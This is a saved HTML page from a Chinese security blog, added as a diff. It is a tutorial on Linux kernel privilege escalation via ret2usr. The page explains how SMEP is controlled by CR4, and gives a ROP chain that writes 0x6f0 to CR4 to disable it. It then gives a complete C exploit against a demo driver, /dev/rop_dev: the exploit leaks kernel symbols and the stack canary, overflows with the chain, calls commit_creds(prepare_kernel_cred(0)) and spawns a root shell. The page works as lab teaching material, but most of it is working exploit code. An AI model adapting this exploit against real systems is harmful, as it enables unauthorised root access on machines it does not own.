@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>linux 内核提权总结(demo&#43;exp分析) -- ROP(二) - povcfe&#39;s blog</title><meta name="Description" content="povcfe&#39;s blog"><meta property="og:title" content="linux 内核提权总结(demo&#43;exp分析) -- ROP(二)" />
+<meta property="og:description" content="发表于看雪论坛
+ret2usr CR4篇   smep: smep是内核的一种保护措施, 使得内核不可执行用户态代码
+ 内核通过CR4寄存器的第20位来控制smep, 第20位为0时，smep被关闭    攻击流程
+ 提前在用户态代码中构造进程提权代码(get_root) ROP技术修改CR4第20位数据为0(关闭smep), 通常使用 mov cr4, 0x6f0 修改 rip 直接指向用户态提权代码,实现进程提权    一. 判断是否开启smep  查看 boot.sh qemu-system-x86_64 \ -kernel bzImage \ -initrd rootfs.img \ -append &#34;console=ttyS0 root=/dev/ram rdinit=/sbin/init&#34; \ -cpu qemu64,&#43;smep,&#43;smap \ -nographic \ -gdb tcp::1234  smep, smap 在boot.sh -cpu选项内进行设置  二. ROP链构造 ROP[i&#43;&#43;] = 0xffffffff810275f1 &#43; offset; //pop rax; ret  ROP[i&#43;&#43;] = 0x6f0; ROP[i&#43;&#43;] = 0xffffffff8123ed93 &#43; offset; //pop rcx; ret  ROP[i&#43;&#43;] = 0; ROP[i&#43;&#43;] = 0xffffffff81003c0e &#43; offset; //mov cr4, rax ; push rcx ; popfq ; pop rbp ; ret  ROP[i&#43;&#43;] = 0; ROP[i&#43;&#43;] = (size_t)get_root; 三." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://povcfe.github.io/posts/kernel_rop2/" />
+<meta property="og:image" content="https://povcfe.github.io/logo.png"/>
+<meta property="article:published_time" content="2020-01-06T10:30:45-08:00" />
+<meta property="article:modified_time" content="2020-01-06T10:30:45-08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://povcfe.github.io/logo.png"/>
+
+<meta name="twitter:title" content="linux 内核提权总结(demo&#43;exp分析) -- ROP(二)"/>
+<meta name="twitter:description" content="发表于看雪论坛
+ret2usr CR4篇   smep: smep是内核的一种保护措施, 使得内核不可执行用户态代码
+ 内核通过CR4寄存器的第20位来控制smep, 第20位为0时，smep被关闭    攻击流程
+ 提前在用户态代码中构造进程提权代码(get_root) ROP技术修改CR4第20位数据为0(关闭smep), 通常使用 mov cr4, 0x6f0 修改 rip 直接指向用户态提权代码,实现进程提权    一. 判断是否开启smep  查看 boot.sh qemu-system-x86_64 \ -kernel bzImage \ -initrd rootfs.img \ -append &#34;console=ttyS0 root=/dev/ram rdinit=/sbin/init&#34; \ -cpu qemu64,&#43;smep,&#43;smap \ -nographic \ -gdb tcp::1234  smep, smap 在boot.sh -cpu选项内进行设置  二. ROP链构造 ROP[i&#43;&#43;] = 0xffffffff810275f1 &#43; offset; //pop rax; ret  ROP[i&#43;&#43;] = 0x6f0; ROP[i&#43;&#43;] = 0xffffffff8123ed93 &#43; offset; //pop rcx; ret  ROP[i&#43;&#43;] = 0; ROP[i&#43;&#43;] = 0xffffffff81003c0e &#43; offset; //mov cr4, rax ; push rcx ; popfq ; pop rbp ; ret  ROP[i&#43;&#43;] = 0; ROP[i&#43;&#43;] = (size_t)get_root; 三."/>
+<meta name="application-name" content="povcfe&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="povcfe&#39;s blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://povcfe.github.io/posts/kernel_rop2/" /><link rel="prev" href="https://povcfe.github.io/posts/kernel_rop1/" /><link rel="next" href="https://povcfe.github.io/posts/kernel_rw1/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "linux 内核提权总结(demo+exp分析) -- ROP(二)",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/povcfe.github.io\/posts\/kernel_rop2\/"
+        },"genre": "posts","keywords": "linux kernel, rop, exp","wordcount":  493 ,
+        "url": "https:\/\/povcfe.github.io\/posts\/kernel_rop2\/","datePublished": "2020-01-06T10:30:45-08:00","dateModified": "2020-01-06T10:30:45-08:00","publisher": {
+            "@type": "Organization",
+            "name": "作者"},"author": {
+                "@type": "Person",
+                "name": "作者"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="povcfe&#39;s blog">povcfe&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="povcfe&#39;s blog">povcfe&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">linux 内核提权总结(demo&#43;exp分析) -- ROP(二)</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>作者</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/linux%E5%86%85%E6%A0%B8%E6%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"><i class="far fa-folder fa-fw"></i>linux内核态漏洞利用</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-01-06">2020-01-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 493 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#ret2usr-cr4篇">ret2usr CR4篇</a>
+      <ul>
+        <li><a href="#一-判断是否开启smep">一. 判断是否开启smep</a></li>
+        <li><a href="#二-rop链构造">二. ROP链构造</a></li>
+        <li><a href="#三-exp">三. exp</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><a href="https://bbs.pediy.com/user-839858.htm" target="_blank" rel="noopener noreffer">发表于看雪论坛</a></p>
+<h2 id="ret2usr-cr4篇">ret2usr CR4篇</h2>
+<ul>
+<li>
+<p>smep: smep是内核的一种保护措施, 使得内核不可执行用户态代码</p>
+<ul>
+<li>内核通过CR4寄存器的第20位来控制smep, 第20位为0时，smep被关闭</li>
+</ul>
+</li>
+<li>
+<p>攻击流程</p>
+<ol>
+<li>提前在用户态代码中构造进程提权代码(get_root)</li>
+<li>ROP技术修改CR4第20位数据为0(关闭smep), 通常使用 mov cr4, 0x6f0</li>
+<li>修改 rip 直接指向用户态提权代码,实现进程提权</li>
+</ol>
+</li>
+</ul>
+<h3 id="一-判断是否开启smep">一. 判断是否开启smep</h3>
+<ol>
+<li>查看 boot.sh
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">qemu-system-x86_64 <span class="se">\
+</span><span class="se"></span>-kernel bzImage <span class="se">\
+</span><span class="se"></span>-initrd rootfs.img <span class="se">\
+</span><span class="se"></span>-append <span class="s2">&#34;console=ttyS0 root=/dev/ram rdinit=/sbin/init&#34;</span> <span class="se">\
+</span><span class="se"></span>-cpu qemu64,+smep,+smap <span class="se">\
+</span><span class="se"></span>-nographic <span class="se">\
+</span><span class="se"></span>-gdb tcp::1234
+
+</code></pre></div></li>
+<li>smep, smap 在boot.sh -cpu选项内进行设置</li>
+</ol>
+<h3 id="二-rop链构造">二. ROP链构造</h3>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c">    <span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff810275f1</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">//pop rax; ret
+</span><span class="c1"></span>    <span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6f0</span><span class="p">;</span>
+    <span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff8123ed93</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">//pop rcx; ret
+</span><span class="c1"></span>    <span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff81003c0e</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">//mov cr4, rax ; push rcx ; popfq ; pop rbp ; ret
+</span><span class="c1"></span>    <span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="n">get_root</span><span class="p">;</span>
+</code></pre></div><h3 id="三-exp">三. exp</h3>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// gcc ret2usr.c -masm=intel -static -o ret2usr
+</span><span class="c1"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="n">size_t</span> <span class="n">base</span><span class="p">,</span> <span class="n">commit_creds</span><span class="p">,</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span>
+<span class="n">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">,</span> <span class="n">shell</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">get_shell</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">getuid</span><span class="p">())</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;=.=&#34;</span><span class="p">);</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;failed&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">get_root</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">pkc</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">cc</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
+    <span class="p">(</span><span class="o">*</span><span class="n">cc</span><span class="p">)((</span><span class="o">*</span><span class="n">pkc</span><span class="p">)(</span><span class="mi">0</span><span class="p">));</span>
+    <span class="k">asm</span><span class="p">(</span>    
+        <span class="s">&#34;pushq user_ss;&#34;</span>
+        <span class="s">&#34;pushq user_sp;&#34;</span>
+        <span class="s">&#34;pushq user_rflags;&#34;</span>
+        <span class="s">&#34;pushq user_cs;&#34;</span>
+        <span class="s">&#34;push shell;&#34;</span>
+        <span class="s">&#34;swapgs;&#34;</span>
+        <span class="s">&#34;iretq;&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">save_status</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">__asm__</span><span class="p">(</span><span class="s">&#34;mov user_cs, cs;&#34;</span>
+            <span class="s">&#34;mov user_ss, ss;&#34;</span>
+            <span class="s">&#34;mov user_sp, rsp;&#34;</span>
+            <span class="s">&#34;pushf;&#34;</span>
+            <span class="s">&#34;pop user_rflags;&#34;</span><span class="p">);</span>
+    <span class="n">shell</span> <span class="o">=</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="n">get_shell</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;ip is 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="n">get_shell</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;cs is 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">user_cs</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;ss is 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;sp is 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;flag is 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;status has been saved.&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">size_t</span> <span class="nf">get_addr</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">num</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">+</span> <span class="mi">27</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">cmd</span><span class="p">[</span><span class="n">num</span><span class="p">];</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">num</span><span class="p">);</span>
+    <span class="n">strcat</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;cat /tmp/kallsyms | grep &#34;</span><span class="p">);</span>
+    <span class="n">strcat</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+    <span class="n">strcat</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34; &gt; &#34;</span><span class="p">);</span>
+    <span class="n">strcat</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;the cmd is %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cmd</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">size_t</span> <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;open %s error!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+    <span class="n">addr</span> <span class="o">=</span> <span class="n">strtoul</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;the addr(0x) is: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">addr</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;string conversion integer failed&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">addr</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">size_t</span> <span class="nf">get_canary</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;dmesg | grep canary &gt; canary&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;the cmd is: dmesg | grep canary &gt; canary&#34;</span><span class="p">);</span>
+    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;canary&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;open canary error&#34;</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">size_t</span> <span class="n">canary</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">str_canary</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;0x&#34;</span><span class="p">);</span>
+    <span class="n">canary</span> <span class="o">=</span> <span class="n">strtoul</span><span class="p">(</span><span class="n">str_canary</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+    <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;the canary is 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">canary</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">canary</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">char</span> <span class="o">*</span><span class="nf">rop</span><span class="p">(</span><span class="n">size_t</span> <span class="n">offset</span><span class="p">,</span> <span class="n">size_t</span> <span class="o">*</span><span class="n">ROP</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff810275f1</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">//pop rax; ret
+</span><span class="c1"></span>    <span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6f0</span><span class="p">;</span>
+    <span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff8123ed93</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">//pop rcx; ret
+</span><span class="c1"></span>    <span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff81003c0e</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">//mov cr4, rax ; push rcx ; popfq ; pop rbp ; ret
+</span><span class="c1"></span>    <span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="n">get_root</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">base</span> <span class="o">=</span> <span class="n">get_addr</span><span class="p">(</span><span class="s">&#34;startup_64&#34;</span><span class="p">);</span>
+    <span class="n">commit_creds</span> <span class="o">=</span> <span class="n">get_addr</span><span class="p">(</span><span class="s">&#34;commit_creds&#34;</span><span class="p">);</span>
+    <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="n">get_addr</span><span class="p">(</span><span class="s">&#34;prepare_kernel_cred&#34;</span><span class="p">);</span>
+    <span class="n">size_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">base</span> <span class="o">-</span> <span class="mh">0xffffffff81000000</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;offset is: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/rop_dev&#34;</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">==</span> <span class="n">fd</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;open /dev/rop_dev error&#34;</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="kt">char</span> <span class="n">payload1</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">payload1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">payload1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
+    <span class="n">size_t</span> <span class="n">canary</span> <span class="o">=</span> <span class="n">get_canary</span><span class="p">();</span>
+
+    <span class="n">size_t</span> <span class="n">payload2</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">payload2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6161616161616161</span><span class="p">;</span>
+    <span class="n">payload2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6262626262626262</span><span class="p">;</span>
+    <span class="n">payload2</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+    <span class="n">payload2</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6363636363636363</span><span class="p">;</span>
+    <span class="n">save_status</span><span class="p">();</span>
+    <span class="n">rop</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">payload2</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">payload2</span><span class="p">,</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">19</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-01-06</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux-kernel/">linux kernel</a>,&nbsp;<a href="/tags/rop/">rop</a>,&nbsp;<a href="/tags/exp/">exp</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/kernel_rop1/" class="prev" rel="prev" title="linux 内核提权总结(demo&#43;exp分析) -- ROP(一)"><i class="fas fa-angle-left fa-fw"></i>linux 内核提权总结(demo&#43;exp分析) -- ROP(一)</a>
+            <a href="/posts/kernel_rw1/" class="next" rel="next" title="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(一)">linux 内核提权总结(demo&#43;exp分析) -- 任意读写(一)<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
